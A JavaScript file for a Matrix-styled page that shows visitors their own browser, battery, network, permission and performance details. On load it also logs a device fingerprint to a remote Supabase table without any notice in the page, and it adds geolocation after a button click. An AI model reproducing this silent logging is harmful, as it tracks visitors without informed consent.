const SUPABASE_URL =
"https://xltxohuuafferszitlwn.supabase.co";

const SUPABASE_KEY =
"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InhsdHhvaHVhYWZmZXJzeml0bHduIiwicm9sZSI6ImFub24iLCJpYXQiOjE3Nzg2ODQ2NzYsImV4cCI6MjA5NDI2MDY3Nn0.nn8mTGX_rl8n91lUBqSnJerHWCFo_-2v1lvsFVZ40lc";

const supabaseClient = supabase.createClient(
    SUPABASE_URL,
    SUPABASE_KEY
);

// MATRIX EFFECT

const canvas = document.getElementById("matrix");
const ctx = canvas.getContext("2d");

canvas.width = window.innerWidth;
canvas.height = window.innerHeight;

const chars = "01アイウエオカサタナ";
const fontSize = 14;
const columns = canvas.width / fontSize;

const drops = [];

for(let i=0;i<columns;i++){
    drops[i]=1;
}

function drawMatrix(){

    ctx.fillStyle = "rgba(0,0,0,0.05)";
    ctx.fillRect(0,0,canvas.width,canvas.height);

    ctx.fillStyle = "#00ff99";
    ctx.font = fontSize + "px monospace";

    for(let i=0;i<drops.length;i++){

        const text = chars.charAt(
            Math.floor(Math.random()*chars.length)
        );

        ctx.fillText(
            text,
            i*fontSize,
            drops[i]*fontSize
        );

        if(
            drops[i]*fontSize > canvas.height &&
            Math.random() > 0.975
        ){
            drops[i]=0;
        }

        drops[i]++;
    }
}

setInterval(drawMatrix,33);

// BOOT SEQUENCE

const bootLines = [

    "Initializing cyber modules...",
    "Loading neural interface...",
    "Scanning browser capabilities...",
    "Connecting secure uplink...",
    "Injecting holographic UI...",
    "System online..."

];

const terminalText =
document.getElementById("terminalText");

const bootScreen =
document.getElementById("bootScreen");

const mainContainer =
document.getElementById("mainContainer");

let lineIndex = 0;

function typeBoot(){

    if(lineIndex < bootLines.length){

        const p = document.createElement("p");

        p.textContent = bootLines[lineIndex];

        terminalText.appendChild(p);

        lineIndex++;

        setTimeout(typeBoot,700);

    }else{

        setTimeout(()=>{

            bootScreen.style.display = "none";

            mainContainer.classList.remove("hidden");

            init();

        },1000);
    }
}

typeBoot();

// INIT

async function init(){

    getDeviceInfo();

    getBatteryInfo();

    getNetworkInfo();

    getPermissions();

    getPerformance();

    generateQR();

    saveLog();
}

// DEVICE INFO

function getDeviceInfo(){

    const html = `

    <p>Platform:
    ${navigator.platform}</p>

    <p>User Agent:
    ${navigator.userAgent}</p>

    <p>Language:
    ${navigator.language}</p>

    <p>Screen:
    ${screen.width} x ${screen.height}</p>

    <p>Timezone:
    ${Intl.DateTimeFormat()
    .resolvedOptions().timeZone}</p>

    <p>Online:
    ${navigator.onLine}</p>

    <p>Cookies Enabled:
    ${navigator.cookieEnabled}</p>

    <p>Touch Support:
    ${'ontouchstart' in window}</p>

    <p>CPU Cores:
    ${navigator.hardwareConcurrency || 'N/A'}</p>

    <p>RAM Estimate:
    ${navigator.deviceMemory || 'N/A'} GB</p>

    <p>Bluetooth API:
    ${!!navigator.bluetooth}</p>

    <p>Fullscreen API:
    ${!!document.fullscreenEnabled}</p>

    `;

    document.getElementById("deviceInfo")
    .innerHTML = html;
}

// BATTERY

async function getBatteryInfo(){

    if(!navigator.getBattery){

        document.getElementById("batteryInfo")
        .innerHTML =
        "<p>Battery API unsupported</p>";

        return;
    }

    const battery =
    await navigator.getBattery();

    function updateBattery(){

        document.getElementById("batteryInfo")
        .innerHTML = `

        <p>Battery:
        ${(battery.level*100).toFixed(0)}%</p>

        <p>Charging:
        ${battery.charging}</p>

        <p>Charging Time:
        ${battery.chargingTime}</p>

        <p>Discharging Time:
        ${battery.dischargingTime}</p>

        <div class="progress">

            <div class="progress-bar"
            style="width:${battery.level*100}%">
            </div>

        </div>

        `;
    }

    updateBattery();

    battery.addEventListener(
        "levelchange",
        updateBattery
    );
}

// NETWORK

function getNetworkInfo(){

    const conn = navigator.connection;

    if(!conn){

        document.getElementById("networkInfo")
        .innerHTML =
        "<p>Network API unsupported</p>";

        return;
    }

    document.getElementById("networkInfo")
    .innerHTML = `

    <p>Connection Type:
    ${conn.effectiveType}</p>

    <p>RTT:
    ${conn.rtt}</p>

    <p>Downlink:
    ${conn.downlink}</p>

    <p>Save Data:
    ${conn.saveData}</p>

    `;
}

// LOCATION

document.getElementById("locationBtn")
.addEventListener("click",()=>{

    navigator.geolocation.getCurrentPosition(
        position=>{

        const lat =
        position.coords.latitude;

        const lon =
        position.coords.longitude;

        const acc =
        position.coords.accuracy;

        document.getElementById("locationInfo")
        .innerHTML = `

        <p>Latitude:
        ${lat}</p>

        <p>Longitude:
        ${lon}</p>

        <p>Accuracy:
        ${acc}m</p>

        `;

        saveLog(lat,lon,acc);

    });
});

// PERMISSIONS

async function getPermissions(){

    const permissions = [
        "geolocation",
        "camera",
        "microphone"
    ];

    let html = "";

    for(const permission of permissions){

        try{

            const result =
            await navigator.permissions.query({
                name:permission
            });

            html += `
            <p>${permission}:
            ${result.state}</p>
            `;

        }catch(error){

            html += `
            <p>${permission}:
            unsupported</p>
            `;
        }
    }

    document.getElementById("permissionsInfo")
    .innerHTML = html;
}

// ORIENTATION

window.addEventListener(
"deviceorientation",(e)=>{

    document.getElementById("orientationInfo")
    .innerHTML = `

    <p>Alpha:
    ${e.alpha}</p>

    <p>Beta:
    ${e.beta}</p>

    <p>Gamma:
    ${e.gamma}</p>

    `;
});

// PERFORMANCE

function getPerformance(){

    if(!performance.memory){

        document.getElementById(
        "performanceInfo"
        ).innerHTML =
        "<p>Performance Memory unsupported</p>";

        return;
    }

    document.getElementById(
    "performanceInfo"
    ).innerHTML = `

    <p>Heap Limit:
    ${performance.memory.jsHeapSizeLimit}</p>

    <p>Total Heap:
    ${performance.memory.totalJSHeapSize}</p>

    <p>Used Heap:
    ${performance.memory.usedJSHeapSize}</p>

    `;
}

// QR CODE

function generateQR(){

    QRCode.toCanvas(
        document.getElementById("qrCanvas"),
        window.location.href
    );
}

// SAVE LOG

async function saveLog(
lat="",
lon="",
acc=""
){

    try{

        await supabaseClient
        .from("device_logs")
        .insert([{

            platform:navigator.platform,

            browser:navigator.userAgent,

            language:navigator.language,

            ram:String(
                navigator.deviceMemory
            ),

            cpu:String(
                navigator.hardwareConcurrency
            ),

            online:navigator.onLine,

            timezone:
            Intl.DateTimeFormat()
            .resolvedOptions().timeZone,

            screen:
            `${screen.width}x${screen.height}`,

            dark_mode:
            window.matchMedia(
            "(prefers-color-scheme: dark)"
            ).matches,

            battery:
            navigator.getBattery
            ? "supported"
            : "unsupported",

            charging:false,

            network:
            navigator.connection?.effectiveType
            || "unknown",

            latitude:String(lat),

            longitude:String(lon),

            accuracy:String(acc)

        }]);

        console.log("Saved to Supabase");

    }catch(error){

        console.error(error);
    }
}

// PWA

if("serviceWorker" in navigator){

    navigator.serviceWorker.register(
        "service-worker.js"
    );
}